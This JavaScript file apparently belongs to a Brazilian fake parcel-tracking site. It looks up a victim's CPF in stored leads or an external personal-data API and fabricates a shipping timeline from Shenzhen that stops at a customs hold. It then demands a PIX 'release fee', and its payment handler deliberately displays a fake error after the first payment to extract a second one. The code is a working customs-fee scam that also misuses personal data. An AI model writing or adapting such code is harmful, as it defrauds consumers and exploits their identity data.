/**
 * Sistema de rastreamento aprimorado com integração Zentra Pay
 * VERSÃO LIMPA - SEM SIMULADORES DE TESTE
 */
import { DatabaseService } from '../services/database.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { DataService } from '../utils/data-service.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { Navigation } from './navigation.js';

export class TrackingSystem {
    constructor() {
        this.dbService = new DatabaseService();
        this.zentraPayService = new ZentraPayService();
        this.dataService = new DataService();
        this.currentCPF = null;
        this.userData = null;
        this.trackingData = null;
        this.isInitialized = false;
        this.hasFirstPaymentFailed = false;
        
        console.log('🚀 TrackingSystem inicializado');
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🔧 Inicializando sistema de rastreamento...');
        
        try {
            this.setupCPFInput();
            this.setupTrackingForm();
            this.setupAccordion();
            this.setupModals();
            this.checkURLParams();
            
            this.isInitialized = true;
            console.log('✅ Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) return;

        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
        });

        cpfInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        console.log('✅ Campo CPF configurado');
    }

    setupTrackingForm() {
        const form = document.getElementById('trackingForm');
        const button = document.getElementById('trackButton');

        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }

        if (button) {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }

        console.log('✅ Formulário de rastreamento configurado');
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        if (!detailsHeader) return;

        detailsHeader.addEventListener('click', () => {
            const content = document.getElementById('detailsContent');
            const toggleIcon = detailsHeader.querySelector('.toggle-icon i');
            
            if (content && toggleIcon) {
                const isExpanded = content.classList.contains('expanded');
                
                if (isExpanded) {
                    content.classList.remove('expanded');
                    toggleIcon.classList.remove('rotated');
                } else {
                    content.classList.add('expanded');
                    toggleIcon.classList.add('rotated');
                }
            }
        });

        console.log('✅ Accordion configurado');
    }

    setupModals() {
        this.setupLiberationModal();
        this.setupDeliveryModal();
        console.log('✅ Modais configurados');
    }

    setupLiberationModal() {
        const modal = document.getElementById('liberationModal');
        const closeButton = document.getElementById('closeModal');
        const copyButton = document.getElementById('copyPixButtonModal');

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }

        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }

        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeLiberationModal();
                }
            });
        }
    }

    setupDeliveryModal() {
        const modal = document.getElementById('deliveryModal');
        const closeButton = document.getElementById('closeDeliveryModal');
        const copyButton = document.getElementById('copyPixButtonDelivery');

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryModal();
            });
        }

        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeDeliveryModal();
                }
            });
        }
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusParam = urlParams.get('focus');
        const cpfParam = urlParams.get('cpf');

        if (focusParam === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                    cpfInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
            }, 500);
        }

        if (cpfParam) {
            const cpfInput = document.getElementById('cpfInput');
            if (cpfInput) {
                cpfInput.value = CPFValidator.formatCPF(cpfParam);
                setTimeout(() => {
                    this.handleTrackingSubmit();
                }, 1000);
            }
        }
    }

    async handleTrackingSubmit() {
        console.log('🔍 Iniciando rastreamento...');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('❌ Campo CPF não encontrado');
            return;
        }

        const cpf = cpfInput.value.replace(/[^\d]/g, '');
        
        if (!cpf || cpf.length !== 11) {
            this.showError('Por favor, digite um CPF válido com 11 dígitos');
            return;
        }

        if (!CPFValidator.isValidCPF(cpf)) {
            this.showError('CPF inválido. Verifique os dígitos e tente novamente');
            return;
        }

        this.currentCPF = cpf;
        
        try {
            this.showLoadingNotification();
            
            await this.delay(2000);
            
            const result = await this.getLeadFromDatabase(cpf);
            
            if (result.success && result.data) {
                console.log('✅ Lead encontrado no banco de dados');
                this.userData = {
                    nome: result.data.nome_completo,
                    cpf: result.data.cpf,
                    nascimento: this.generateBirthDate(result.data.cpf),
                    situacao: 'REGULAR'
                };
            } else {
                console.log('🌐 Buscando dados na API externa...');
                const apiResult = await this.dataService.fetchCPFData(cpf);
                
                if (apiResult && apiResult.DADOS) {
                    this.userData = apiResult.DADOS;
                } else {
                    throw new Error('Dados não encontrados');
                }
            }

            this.closeLoadingNotification();
            
            this.displayOrderDetails();
            this.generateTrackingData();
            this.displayTrackingResults();
            
            const orderDetails = document.getElementById('orderDetails');
            if (orderDetails) {
                this.scrollToElement(orderDetails, 100);
            }
            
            setTimeout(() => {
                this.highlightLiberationButton();
            }, 1500);
            
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            this.closeLoadingNotification();
            this.showError('CPF não encontrado em nossa base de dados');
        }
    }

    async getLeadFromDatabase(cpf) {
        try {
            const cleanCPF = cpf.replace(/[^\d]/g, '');
            const leads = JSON.parse(localStorage.getItem('leads') || '[]');
            const lead = leads.find(l => l.cpf && l.cpf.replace(/[^\d]/g, '') === cleanCPF);
            
            if (lead) {
                console.log('✅ Lead encontrado:', lead);
                return { success: true, data: lead };
            } else {
                console.log('❌ Lead não encontrado para CPF:', cleanCPF);
                return { success: false, error: 'Lead não encontrado' };
            }
        } catch (error) {
            console.error('❌ Erro ao buscar lead:', error);
            return { success: false, error: error.message };
        }
    }

    generateBirthDate(cpf) {
        const cleanCPF = cpf.replace(/[^\d]/g, '');
        const year = 1960 + (parseInt(cleanCPF.slice(0, 2)) % 40);
        const month = (parseInt(cleanCPF.slice(2, 4)) % 12) + 1;
        const day = (parseInt(cleanCPF.slice(4, 6)) % 28) + 1;
        
        return `${day.toString().padStart(2, '0')}/${month.toString().padStart(2, '0')}/${year}`;
    }

    displayOrderDetails() {
        if (!this.userData) return;

        const orderDetails = document.getElementById('orderDetails');
        if (orderDetails) {
            orderDetails.style.display = 'block';
        }

        this.updateElement('customerName', this.userData.nome);
        this.updateElement('fullName', this.userData.nome);
        this.updateElement('formattedCpf', CPFValidator.formatCPF(this.userData.cpf));
        this.updateElement('customerProduct', 'Kit 12 caixas organizadoras + brinde');
        this.updateElement('customerDeliveryAddress', 'Rua das Flores, 123 - Centro - São Paulo/SP');

        console.log('✅ Detalhes do pedido exibidos');
    }

    generateTrackingData() {
        const today = new Date();
        this.trackingData = {
            cpf: this.currentCPF,
            currentStep: 'customs',
            steps: [],
            liberationPaid: false,
            liberationDate: null,
            deliveryAttempts: 0,
            lastUpdate: today.toISOString()
        };

        const dates = this.generateRealisticDates(today, 11);
        const trackingSteps = this.getTrackingSteps();
        
        for (let i = 0; i < 10; i++) {
            this.trackingData.steps.push({
                id: i + 1,
                date: dates[i],
                title: trackingSteps[i].title,
                description: trackingSteps[i].description,
                isChina: trackingSteps[i].isChina || false,
                completed: true
            });
        }

        this.trackingData.steps.push({
            id: 11,
            date: dates[10],
            title: trackingSteps[10].title,
            description: trackingSteps[10].description,
            completed: true,
            needsLiberation: true
        });

        console.log('✅ Dados de rastreamento gerados');
    }

    generateRealisticDates(endDate, numSteps) {
        const dates = [];
        const now = new Date();
        const today = new Date(endDate);
        
        const day1 = new Date(today);
        day1.setDate(day1.getDate() - 2);
        dates.push(this.getRandomTimeOnDate(day1));
        dates.push(this.getRandomTimeOnDate(day1));
        
        const day2 = new Date(today);
        day2.setDate(day2.getDate() - 1);
        for (let i = 2; i < 9; i++) {
            dates.push(this.getRandomTimeOnDate(day2));
        }
        
        dates.push(this.getTimeBeforeNow(today, now, 1));
        dates.push(this.getTimeBeforeNow(today, now, 2));
        
        return dates;
    }

    getRandomTimeOnDate(date) {
        const newDate = new Date(date);
        const hour = Math.floor(Math.random() * 18) + 5;
        const minute = Math.floor(Math.random() * 60);
        newDate.setHours(hour, minute, 0, 0);
        return newDate;
    }

    getTimeBeforeNow(targetDate, currentTime, stepOrder) {
        const newDate = new Date(targetDate);
        const currentHour = currentTime.getHours();
        const currentMinute = currentTime.getMinutes();
        
        let hoursBack;
        if (stepOrder === 1) {
            hoursBack = Math.floor(Math.random() * 4) + 2;
        } else {
            hoursBack = Math.random() * 1.5 + 0.5;
        }
        
        const targetTime = new Date(currentTime);
        targetTime.setHours(targetTime.getHours() - hoursBack);
        
        if (targetTime.getHours() < 6) {
            targetTime.setHours(6 + Math.floor(Math.random() * 2));
            targetTime.setMinutes(Math.floor(Math.random() * 60));
        }
        
        newDate.setHours(targetTime.getHours(), targetTime.getMinutes(), 0, 0);
        
        return newDate;
    }

    getTrackingSteps() {
        return [
            { title: "Seu pedido foi criado", description: "Seu pedido foi criado" },
            { title: "Preparando para envio", description: "O seu pedido está sendo preparado para envio" },
            { title: "Pedido enviado", description: "[China] O vendedor enviou seu pedido", isChina: true },
            { title: "Centro de triagem", description: "[China] O pedido chegou ao centro de triagem de Shenzhen", isChina: true },
            { title: "Centro logístico", description: "[China] Pedido saiu do centro logístico de Shenzhen", isChina: true },
            { title: "Trânsito internacional", description: "[China] Coletado. O pedido está em trânsito internacional", isChina: true },
            { title: "Liberado para exportação", description: "[China] O pedido foi liberado na alfândega de exportação", isChina: true },
            { title: "Saiu da origem", description: "Pedido saiu da origem: Shenzhen" },
            { title: "Chegou no Brasil", description: "Pedido chegou no Brasil" },
            { title: "Centro de distribuição", description: "Pedido em trânsito para CURITIBA/PR" },
            { title: "Alfândega de importação", description: "Pedido chegou na alfândega de importação: CURITIBA/PR" }
        ];
    }

    displayTrackingResults() {
        if (!this.trackingData) return;

        const trackingResults = document.getElementById('trackingResults');
        if (trackingResults) {
            trackingResults.style.display = 'block';
        }

        this.updateElement('customerNameStatus', this.userData.nome);
        this.updateElement('currentStatus', 'Aguardando liberação aduaneira');

        this.renderTimeline();

        console.log('✅ Resultados de rastreamento exibidos');
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        timeline.innerHTML = '';

        this.trackingData.steps.forEach((step, index) => {
            if (step.completed) {
                const timelineItem = this.createTimelineItem(step, index === this.trackingData.steps.length - 1);
                timeline.appendChild(timelineItem);
                
                setTimeout(() => {
                    timelineItem.style.opacity = '1';
                    timelineItem.style.transform = 'translateY(0)';
                }, 100 * index);
            }
        });

        console.log('✅ Timeline renderizada');
    }

    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';
        
        const dateStr = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        
        const timelineDot = document.createElement('div');
        timelineDot.className = 'timeline-dot';
        
        const timelineContent = document.createElement('div');
        timelineContent.className = 'timeline-content';
        
        const timelineDate = document.createElement('div');
        timelineDate.className = 'timeline-date';
        timelineDate.innerHTML = `
            <span class="date">${dateStr}</span>
            <span class="time">${timeStr}</span>
        `;
        
        const timelineText = document.createElement('div');
        timelineText.className = 'timeline-text';
        
        const description = document.createElement('p');
        description.textContent = step.description;
        timelineText.appendChild(description);
        
        if (step.needsLiberation && step.completed) {
            const liberationButton = document.createElement('button');
            liberationButton.className = 'liberation-button-timeline';
            liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR PACOTE';
            
            liberationButton.addEventListener('click', () => {
                this.showLiberationModal();
            });
            
            timelineText.appendChild(liberationButton);
            
            console.log('✅ Botão de liberação criado e adicionado ao DOM');
        }
        
        timelineContent.appendChild(timelineDate);
        timelineContent.appendChild(timelineText);
        
        item.appendChild(timelineDot);
        item.appendChild(timelineContent);
        
        return item;
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline:last-of-type');
        
        if (liberationButton) {
            console.log('✅ Botão LIBERAR PACOTE encontrado, aplicando destaque');
            
            liberationButton.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            setTimeout(() => {
                liberationButton.style.animation = 'highlightPulse 2s ease-in-out 3';
                liberationButton.style.background = 'linear-gradient(45deg, #1e4a6b, #2c5f8a)';
                liberationButton.style.boxShadow = '0 8px 25px rgba(30, 74, 107, 0.6)';
            }, 500);
        } else {
            console.error('❌ Botão LIBERAR PACOTE não encontrado no DOM');
        }
    }

    hideLiberationButton() {
        const liberationButtons = document.querySelectorAll('.liberation-button-timeline');
        liberationButtons.forEach(button => {
            button.style.display = 'none';
        });
        console.log('🔒 Botão LIBERAR PACOTE ocultado');
    }

    async showLiberationModal() {
        console.log('🔓 Abrindo modal de liberação aduaneira...');
        
        try {
            const userData = {
                nome: this.userData.nome,
                cpf: this.userData.cpf,
                email: this.userData.email || `lead${Date.now()}@tempmail.com`,
                telefone: this.userData.telefone || `11${Date.now().toString().slice(-8)}`
            };
            
            const valorEmReais = window.valor_em_reais || 26.34;
            
            console.log('🚀 Gerando PIX via Zentra Pay...');
            const pixResult = await this.zentraPayService.createPixTransaction(userData, valorEmReais);
            
            if (pixResult.success) {
                console.log('✅ PIX gerado com sucesso!');
                this.updatePixInModal(pixResult.pixPayload);
            } else {
                console.warn('⚠️ Erro ao gerar PIX, usando estático:', pixResult.error);
            }
            
        } catch (error) {
            console.error('❌ Erro ao gerar PIX:', error);
        }
        
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }

    updatePixInModal(pixPayload) {
        const pixInput = document.getElementById('pixCodeModal');
        const qrCodeImg = document.getElementById('realPixQrCode');
        
        if (pixInput && pixPayload) {
            pixInput.value = pixPayload;
        }
        
        if (qrCodeImg && pixPayload) {
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixPayload)}`;
            qrCodeImg.src = qrCodeUrl;
        }
        
        console.log('✅ PIX atualizado no modal');
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    closeDeliveryModal() {
        const modal = document.getElementById('deliveryModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('pixCodeDelivery');
        const copyButton = document.getElementById('copyPixButtonDelivery');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX de entrega copiado');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX de entrega:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    processSuccessfulPayment() {
        console.log('💳 Processando pagamento bem-sucedido...');
        
        if (!this.hasFirstPaymentFailed) {
            console.log('🔄 Primeiro pagamento - simulando erro...');
            this.hasFirstPaymentFailed = true;
            this.closeLiberationModal();
            
            setTimeout(() => {
                this.showPaymentErrorModal();
            }, 500);
            return;
        }
        
        console.log('✅ Segundo pagamento - processando com sucesso...');
        
        this.closeLiberationModal();
        this.hideLiberationButton();
        
        setTimeout(() => {
            this.showPaymentSuccessNotification();
        }, 500);
    }

    showPaymentErrorModal() {
        const errorModal = document.createElement('div');
        errorModal.className = 'modal-overlay';
        errorModal.id = 'paymentErrorModal';
        errorModal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        errorModal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header" style="background: linear-gradient(135deg, #e74c3c, #c0392b);">
                    <h2 class="professional-modal-title">Erro no Pagamento</h2>
                    <button class="professional-modal-close" id="closeErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div style="text-align: center; margin-bottom: 30px;">
                        <div style="margin-bottom: 20px;">
                            <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                        </div>
                        <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                            Erro ao processar o pagamento
                        </h3>
                        <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 30px;">
                            Ocorreu um problema ao processar seu pagamento. Por favor, tente novamente.
                        </p>
                        
                        <button id="retryPaymentButton" style="
                            background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
                            color: white;
                            border: none;
                            padding: 15px 30px;
                            font-size: 1.1rem;
                            font-weight: 700;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.3s ease;
                            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
                            display: inline-flex;
                            align-items: center;
                            gap: 10px;
                        ">
                            <i class="fas fa-redo"></i> Tentar Novamente
                        </button>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(errorModal);
        document.body.style.overflow = 'hidden';

        const closeButton = errorModal.querySelector('#closeErrorModal');
        const retryButton = errorModal.querySelector('#retryPaymentButton');

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }

        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                setTimeout(() => {
                    this.showLiberationModal();
                }, 300);
            });
        }

        errorModal.addEventListener('click', (e) => {
            if (e.target === errorModal) {
                this.closePaymentErrorModal();
            }
        });

        console.log('❌ Modal de erro de pagamento exibido');
    }

    closePaymentErrorModal() {
        const modal = document.getElementById('paymentErrorModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showPaymentSuccessNotification() {
        const notification = document.createElement('div');
        notification.id = 'paymentSuccessNotification';
        notification.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        notification.innerHTML = `
            <div style="
                background: white;
                border-radius: 20px;
                padding: 40px;
                text-align: center;
                max-width: 400px;
                width: 90%;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                animation: slideUp 0.3s ease;
                border: 3px solid #27ae60;
            ">
                <div style="margin-bottom: 20px;">
                    <i class="fas fa-check-circle" style="font-size: 3rem; color: #27ae60; animation: bounceIn 0.6s ease;"></i>
                </div>
                <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                    Pagamento Confirmado!
                </h3>
                <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                    Seu pedido foi liberado na alfândega e seguirá para entrega
                </p>
                <button onclick="this.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" style="
                    background: #27ae60;
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: 600;
                    transition: all 0.3s ease;
                ">
                    Continuar
                </button>
            </div>
        `;

        document.body.appendChild(notification);
        document.body.style.overflow = 'hidden';

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
                document.body.style.overflow = 'auto';
            }
        }, 5000);

        console.log('✅ Notificação de pagamento confirmado exibida');
    }

    showLoadingNotification() {
        const notificationOverlay = document.createElement('div');
        notificationOverlay.id = 'trackingNotification';
        notificationOverlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const notificationContent = document.createElement('div');
        notificationContent.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `;

        notificationContent.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `;

        notificationOverlay.appendChild(notificationContent);
        document.body.appendChild(notificationOverlay);
        document.body.style.overflow = 'hidden';

        if (!document.getElementById('trackingAnimations')) {
            const style = document.createElement('style');
            style.id = 'trackingAnimations';
            style.textContent = `
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
    }

    closeLoadingNotification() {
        const notification = document.getElementById('trackingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showError(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `;
        errorDiv.textContent = message;

        const form = document.querySelector('.tracking-form');
        if (form) {
            form.appendChild(errorDiv);

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.style.animation = 'slideUp 0.3s ease';
                    setTimeout(() => errorDiv.remove(), 300);
                }
            }, 5000);
        }
    }

    scrollToElement(element, offset = 0) {
        if (!element) return;

        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
        const offsetPosition = elementPosition - offset;

        window.scrollTo({
            top: offsetPosition,
            behavior: 'smooth'
        });
    }

    updateElement(id, text) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = text;
        }
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    reset() {
        this.currentCPF = null;
        this.userData = null;
        this.trackingData = null;
        this.hasFirstPaymentFailed = false;
        
        const orderDetails = document.getElementById('orderDetails');
        const trackingResults = document.getElementById('trackingResults');
        
        if (orderDetails) orderDetails.style.display = 'none';
        if (trackingResults) trackingResults.style.display = 'none';
        
        this.closeLiberationModal();
        this.closeDeliveryModal();
        
        const cpfInput = document.getElementById('cpfInput');
        if (cpfInput) {
            cpfInput.value = '';
            cpfInput.focus();
        }
        
        console.log('🔄 Sistema resetado');
    }
}